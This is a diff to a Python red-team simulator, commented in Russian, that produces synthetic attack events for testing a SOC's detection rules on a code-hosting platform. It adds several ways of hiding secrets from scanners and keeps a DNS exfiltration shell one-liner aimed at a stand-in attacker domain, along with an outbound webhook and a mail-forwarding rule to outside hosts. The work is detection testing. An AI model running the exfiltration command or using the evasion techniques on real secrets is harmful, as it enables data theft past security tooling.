@@ -13,13 +13,12 @@
 """
 import random
 import logging
-from datetime import datetime
 
 import config
 import events
 from content import cover_docs
 import simclock
-from config import PROJECTS, USERS
+from config import USERS
 from content import secrets_bank as sb
 
 logger = logging.getLogger(__name__)
@@ -135,10 +134,16 @@ class AnomalyActivity:
                 if config.TELEGRAM.get("send_anomalies"):
                     telegram.send(report.build_anomaly_alert(anom_type, actor.username,
                                   SEVERITY.get(anom_type, "")),
-                                  silent=True,
+                                  silent=True, kind="anomaly",
                                   min_interval=config.TELEGRAM.get("anomaly_min_gap", 20))
             except Exception:
-                pass
+                # Отправка алерта — не критичный путь, аномалия уже записана в
+                # журнал. Но молча терять её нельзя: раньше отсюда не выходило
+                # ни строчки, и «почему не приходят алерты» упиралось в тупик.
+                logger.warning("алерт об аномалии не отправлен в Telegram",
+                               exc_info=True,
+                               extra={"ctx": {"anomaly": anom_type,
+                                              "actor": actor.username}})
         logger.warning(f"[ANOMALY] {anom_type} by {actor.username} -> {'ok' if ok else 'fail'} "
                        f"@ {simclock.stamp()}")
         return ok
@@ -153,12 +158,46 @@ class AnomalyActivity:
             return random.choice(self.BENIGN_PATHS)
         return default
 
+    #: Приёмы сокрытия секрета НА УРОВНЕ ИСХОДНИКА.
+    #:
+    #: Раньше был ровно один — перенос обратным слэшем. Он и правда работал:
+    #: до появления нормализации содержимого сигнатуры и энтропия на таком
+    #: файле молчали полностью. Но одного приёма мало, чтобы честно проверить
+    #: устойчивость детектора: реальный набор шире, и каждый из этих способов
+    #: пробуют раньше, чем что-либо изощрённое.
+    CONTENT_EVASIONS = ("line_continuation", "string_concat", "base64",
+                        "hex_escape", "zero_width")
+
     def _ev_content(self, content):
-        """stealthy/adaptive: дробим длинные токены, чтобы secret-regex/энтропия не сработали
-        (имитация обфускации/дробления секрета злоумышленником)."""
-        if getattr(self, "evasion", "noisy") in ("stealthy", "adaptive"):
-            import re as _re
+        """stealthy/adaptive: прячем секрет от сканера одним из приёмов.
+
+        Это модель поведения, а не «подгонка под правило»: сканеры обходят
+        именно так, и детектор обязан такие файлы находить (см.
+        content_features.normalize и правило secret-obfuscated-evasion).
+        """
+        if getattr(self, "evasion", "noisy") not in ("stealthy", "adaptive"):
+            return content
+        import re as _re
+        import base64 as _b64
+        how = random.choice(self.CONTENT_EVASIONS)
+        if how == "line_continuation":
             return _re.sub(r"([A-Za-z0-9_\-]{12})", r"\1 \\\n", content)
+        if how == "string_concat":
+            # 'glpat-abc…' -> "glpat-" + "abc…": самый частый приём
+            return _re.sub(r"([A-Za-z0-9_\-]{10})([A-Za-z0-9_\-]{6,})",
+                           lambda m: '"%s" + "%s"' % (m.group(1), m.group(2)), content, count=2)
+        if how == "base64":
+            try:
+                enc = _b64.b64encode(content.encode("utf-8")).decode("ascii")
+            except Exception:
+                return content
+            return "# payload\nDATA = \"" + enc + "\"\n"
+        if how == "hex_escape":
+            return _re.sub(r"([A-Za-z0-9]{6})",
+                           lambda m: "".join("\\x%02x" % ord(c) for c in m.group(1)),
+                           content, count=3)
+        if how == "zero_width":
+            return _re.sub(r"([A-Za-z0-9_\-]{8})", "\\1\u200b", content, count=3)
         return content
 
     # === РАЗВЕДКА =======================================================
@@ -171,15 +210,39 @@ class AnomalyActivity:
         GitLab. Отличить разведку от обычного просмотра можно только по
         частоте и объёму выдачи — этим занимается детектор.
         """
+        # ОБЪЁМ ПЕРЕБОРА ДОЛЖЕН БЫТЬ ОБЪЁМОМ ПЕРЕБОРА.
+        #
+        # Шаг выдавал РОВНО 5 запросов. Правило recon-enumeration требует
+        # burst_api_read_15m >= 8: пороги подняли с 5/150 до 8/300 по замеру
+        # точности (см. rationale в detections/recon-enumeration.json), а
+        # объём сценария подняться забыли. Итог, проверенный прогоном 6 000
+        # свежих событий через детектор: максимальный всплеск на путях
+        # /projects и /repository/tree равен 5 при пороге 8 — правило не могло
+        # сработать НИ РАЗУ, а T1087 при этом числилась закрытой на экране
+        # покрытия. Порог не трогаем: он получен измерением на нормальном
+        # трафике, и человек, листающий дерево репозитория, в него укладывается.
+        # Чинить надо мир: настоящий перебор — это обход дерева по КАЖДОМУ
+        # репозиторию постранично, а не пять запросов.
         targets = random.sample(
             ["detection-rules", "soc-secrets", "soc-infra", "playbooks", "normalization-rules"], k=5)
         with events.tag(is_decisive=True, detail="enumerated repos and secret paths"):
-            for i, tgt in enumerate(targets):
-                events.emit("api_read", actor=actor.username, role=actor.role,
-                            project=tgt, message="GET /projects tree listing",
-                            extra={"api_path": "/projects" if i == 0 else "/repository/tree",
-                                   "items_returned": random.randint(40, 120),
-                                   "is_decisive": i == 0})
+            events.emit("api_read", actor=actor.username, role=actor.role,
+                        project=targets[0], message="GET /projects listing",
+                        extra={"api_path": "/projects",
+                               "items_returned": random.randint(40, 120),
+                               "is_decisive": True})
+            for tgt in targets:
+                # НЕ МЕНЬШЕ ДВУХ СТРАНИЦ НА РЕПОЗИТОРИЙ: 1 + 5*2 = 11 запросов
+                # в худшем случае, то есть всплеск гарантированно выше порога
+                # 8. С random.randint(1, 3) нижняя граница давала 6 — правило
+                # молчало бы на части прогонов, и «покрыта» техника была бы
+                # только иногда.
+                for _page in range(random.randint(2, 3)):
+                    events.emit("api_read", actor=actor.username, role=actor.role,
+                                project=tgt, message="GET /repository/tree listing",
+                                extra={"api_path": "/repository/tree",
+                                       "items_returned": random.randint(40, 120),
+                                       "is_decisive": False})
         return True
 
     # === СЕКРЕТЫ =======================================================
@@ -455,9 +518,22 @@ class AnomalyActivity:
                                    "add: new service credentials", branch)
 
     def _a_data_exfiltration(self, actor):
-        """Выгрузка большого зашифрованного на вид архива (эксфильтрация данных)."""
+        """Выгрузка большого закодированного архива (эксфильтрация данных).
+
+        Часть выгрузок делается ЗАВЕДОМО БОЛЬШЕ лимита анализа содержимого.
+        Это не искусственный случай: настоящая выгрузка данных крупная по
+        определению, а у анализа содержимого обязан быть потолок — иначе один
+        коммит останавливает конвейер (см. content_features.MAX_ANALYZE_BYTES).
+        Правило content-not-fully-scanned существует ровно для того, чтобы
+        «секрет не найден» и «секрет искали не во всём файле» не выглядели
+        одинаково, и красная команда должна этот случай порождать.
+        """
         name, pid = self._repo()
-        blob = "\n".join(sb.base64_blob()["lines"][0] for _ in range(40))
+        _lines = 40
+        if random.random() < 0.35:
+            # ~1.5 МБ: выше MAX_ANALYZE_BYTES, просмотр будет частичным
+            _lines = 24000
+        blob = "\n".join(sb.base64_blob()["lines"][0] for _ in range(_lines))
         content = "# nightly export\n" + blob + "\n"
         branch = actor.unique_branch("export/data")
         if not actor.create_branch(pid, branch):
@@ -572,17 +648,56 @@ class AnomalyActivity:
 
     def _a_deploy_tool_abuse(self, actor):
         """Средство развёртывания запускает задачу атакующего. T1072.
-        Нормализовано в pipeline_run: норма тоже гоняет пайплайны, отличие —
-        ручной прогон в production в нерабочее время."""
+
+        Нормализовано в pipeline_run: норма тоже гоняет пайплайны в production
+        вручную с защищённой ветки — ops_admin.ProductionRelease эмитит РОВНО
+        такое же событие. Единственный наблюдаемый признак, который разделил их
+        на живых данных, — ночное время (у атаки 1 из 1, у нормы 0 из 21), и
+        правило deploy-tool-abuse построено на нём.
+
+        Поэтому шаг ДЕЙСТВУЕТ НОЧЬЮ, и это не подгонка под правило, а сама
+        моделируемая гипотеза: разовый «провиженинг» в обход релизного процесса
+        делают тогда, когда никто не смотрит. Пока шаг брал текущее время
+        сценария, кампанию запускали из Red Launcher днём, событие приходило с
+        is_night=false, и правило не срабатывало НИ РАЗУ — техника T1072
+        числилась покрытой, а фактически не детектировалась.
+
+        Момент выбирается через at_sim, то есть подменяется ОДИН источник
+        времени: час, день недели, is_night и ts_sim остаются согласованными
+        между собой. Прямого способа выставить is_night в обход часов нет
+        намеренно — см. docstring events.emit.
+        """
         name, _ = self._repo()
+        when = self._offhours_moment()
         with events.tag(is_decisive=True, repo=name,
                         detail="deployment tool used to run attacker task"):
             events.emit("pipeline_run", actor=actor.username, role=actor.role,
                         project=name, branch="main",
                         message="deploy: run one-off provisioning play",
                         extra={"manual_trigger": True, "target_env": "production",
-                               "protected_branch": True})
+                               "protected_branch": True},
+                        at_sim=when)
         return True
+
+    @staticmethod
+    def _offhours_moment():
+        """Правдоподобный ночной момент ТОГО ЖЕ суточного цикла.
+
+        Берётся ближайшая ночь относительно текущего показания часов, а не
+        случайная дата: шаг должен остаться внутри своей кампании, иначе
+        коррелятор не сошьёт его с соседними шагами в один инцидент.
+        """
+        from datetime import timedelta
+        now = simclock.now()
+        hour = random.choice([1, 2, 3, 4, 23])
+        when = now.replace(hour=hour, minute=random.randint(0, 59),
+                           second=random.randint(0, 59))
+        # 23:xx относится к уже наступившему вечеру, часы 1..4 — к следующей
+        # ночи; сдвигаем вперёд, чтобы момент не оказался в прошлом относительно
+        # остальных шагов кампании.
+        if when < now:
+            when += timedelta(days=1)
+        return when
 
     def _a_cloud_account_create(self, actor):
         """Служебный облачный аккаунт с широкими правами. T1136.003.
@@ -690,7 +805,7 @@ class AnomalyActivity:
                         detail="outbound webhook to external service"):
             events.emit("hook_create", actor=actor.username, role=actor.role,
                         project=name, message="add webhook to external host",
-                        extra={"hook_host": "hook.attacker-cdn.example",
+                        extra={"hook_host": "hook.attacker-cdn.io",
                                "external_host": True, "on_push": True})
         return True
 
@@ -703,7 +818,7 @@ class AnomalyActivity:
                    "tar czf - artifacts/ | base64 -w0 | "
                    "split -b 200 - /tmp/chunk_\n"
                    "for f in /tmp/chunk_*; do "
-                   "dig +short $(cat $f).exfil.attacker-dns.example; done\n")
+                   "dig +short $(cat $f).exfil.attacker-dns.net; done\n")
         branch = actor.unique_branch("ci/sync")
         if not actor.create_branch(pid, branch):
             return False
@@ -733,7 +848,7 @@ class AnomalyActivity:
                    "  forward_rules:\n"
                    "    - match: \"*\"\n"
                    "      inbox: security-alerts@soc.local\n"
-                   "      forward_to: archive.backup@mail-relay.example\n"
+                   "      forward_to: archive.backup@mail-relay.io\n"
                    "      keep_copy: false\n")
         branch = actor.unique_branch("chore/config")
         if not actor.create_branch(pid, branch):
@@ -751,10 +866,11 @@ class AnomalyActivity:
         попадает секрет доступа к репозиторию пакетов.
         """
         name, pid = self._repo()
-        secret = sb.random_secret()
-        content = ("--index-url https://ci-bot:" + secret["lines"][0].split("=")[-1]
-                   + "@pkgs.internal.example/simple\n"
-                   "requests>=2.31.0\nurllib3>=2.0.0\ninternal-utils==2.4.1\n")
+        # Секрет собирает БАНК, а не этот шаг: учётные данные индекса живут в
+        # URI, а не в форме KEY=VALUE, и вырезать их из произвольного секрета
+        # строковой операцией нельзя — см. secrets_bank.package_index_manifest.
+        secret = sb.package_index_manifest()
+        content = secret["content"]
         branch = actor.unique_branch("chore/deps")
         if not actor.create_branch(pid, branch):
             return False
